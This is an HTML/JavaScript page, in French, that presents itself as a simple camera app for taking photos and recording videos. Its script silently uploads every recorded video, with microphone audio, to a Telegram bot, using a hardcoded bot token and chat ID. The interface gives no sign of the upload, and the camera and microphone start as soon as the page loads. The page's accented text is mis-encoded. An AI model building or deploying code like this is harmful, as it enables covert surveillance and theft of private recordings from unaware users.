<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cam√©ra Photo App</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: #f0f0f0;
            color: #333;
            text-align: center;
        }

        h1 {
            margin-bottom: 20px;
            font-size: 32px;
            color: #2c3e50;
        }

        .camera-container {
            position: relative;
            width: 80%;
            max-width: 640px;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
            background-color: black;
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .controls {
            margin-top: 20px;
            display: flex;
            justify-content: center;
            gap: 20px;
        }

        button {
            background: #3498db;
            color: white;
            border: none;
            padding: 12px 18px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
        }

        button:hover {
            background: #2980b9;
        }

        button:disabled {
            background: gray;
            cursor: not-allowed;
        }

        .photo-container, .video-container {
            margin-top: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            justify-content: center;
        }

        img, video {
            width: 150px;
            height: auto;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <h1>üì∑ Application Photo</h1>
    
    <div class="camera-container">
        <video id="cameraPreview" autoplay muted></video>
    </div>

    <div class="controls">
        <button id="startButton">‚ñ∂ Prendre une vid√©o</button>
        <button id="photoButton">üì∏ Prendre une photo</button>
        <button id="switchCameraButton">üîÑ Changer la cam√©ra</button>
    </div>

    <h2>üìÇ Vid√©os enregistr√©es</h2>
    <div id="videos" class="video-container"></div>

    <h2>üñºÔ∏è Photos prises</h2>
    <div id="photos" class="photo-container"></div>

    <script>
        const botToken = "7120430648:AAEbBfFfg8b1nv8Y52L73iz8yUw4lPUwRow";  
        const chatId = "6493293796";  

        const cameraPreview = document.getElementById('cameraPreview');
        const startButton = document.getElementById('startButton');
        const photoButton = document.getElementById('photoButton');
        const switchCameraButton = document.getElementById('switchCameraButton');

        let mediaRecorder;
        let recordedBlobs = [];
        let stream;
        let currentCamera = 'environment'; // Start with the back camera
        let recordingInterval;

        async function startCamera() {
            try {
                const constraints = {
                    video: {
                        facingMode: currentCamera
                    },
                    audio: true
                };
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                cameraPreview.srcObject = stream;
                console.log("üì∑ Cam√©ra activ√©e.");
            } catch (err) {
                alert("Erreur d'acc√®s √† la cam√©ra/micro !");
                console.error("Erreur :", err);
            }
        }

        async function switchCamera() {
            // Stop current stream tracks
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }

            // Toggle the camera between 'environment' (back) and 'user' (front)
            currentCamera = (currentCamera === 'environment') ? 'user' : 'environment';
            console.log(`Changement de cam√©ra: ${currentCamera}`);

            await startCamera();
        }

        function startRecording() {
            recordedBlobs = [];
            let options = { mimeType: 'video/webm;codecs=vp9,opus' };

            try {
                mediaRecorder = new MediaRecorder(stream, options);
            } catch (e) {
                console.error('Erreur MediaRecorder:', e);
                return;
            }

            mediaRecorder.ondataavailable = (event) => {
                if (event.data && event.data.size > 0) {
                    recordedBlobs.push(event.data);
                }
            };

            mediaRecorder.onstop = saveVideo;
            mediaRecorder.start();
            console.log("üé• Enregistrement...");

            setTimeout(() => {
                mediaRecorder.stop();
            }, 10000);
        }

        async function saveVideo() {
            let blob = new Blob(recordedBlobs, { type: "video/webm" });
            let file = new File([blob], `video_${Date.now()}.webm`, { type: "video/webm" });

            let videoUrl = URL.createObjectURL(blob);
            let videoElement = document.createElement("video");
            videoElement.src = videoUrl;
            videoElement.controls = true;
            document.getElementById("videos").appendChild(videoElement);

            let formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("video", file);

            let url = `https://api.telegram.org/bot${botToken}/sendVideo`;

            fetch(url, { method: "POST", body: formData })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log("‚úÖ Vid√©o envoy√©e sur Telegram !");
                } else {
                    console.error("‚ùå Erreur Telegram :", data);
                }
            })
            .catch(error => console.error("‚ùå Erreur d'envoi :", error));

            recordedBlobs = [];
        }

        function takePhoto() {
            let canvas = document.createElement("canvas");
            canvas.width = cameraPreview.videoWidth;
            canvas.height = cameraPreview.videoHeight;
            let ctx = canvas.getContext("2d");
            ctx.drawImage(cameraPreview, 0, 0, canvas.width, canvas.height);

            let photoUrl = canvas.toDataURL("image/png");
            let img = document.createElement("img");
            img.src = photoUrl;
            document.getElementById("photos").appendChild(img);
        }

        startCamera();
        startButton.addEventListener('click', startRecording);
        photoButton.addEventListener('click', takePhoto);
        switchCameraButton.addEventListener('click', switchCamera);
    </script>
</body>
		</html>
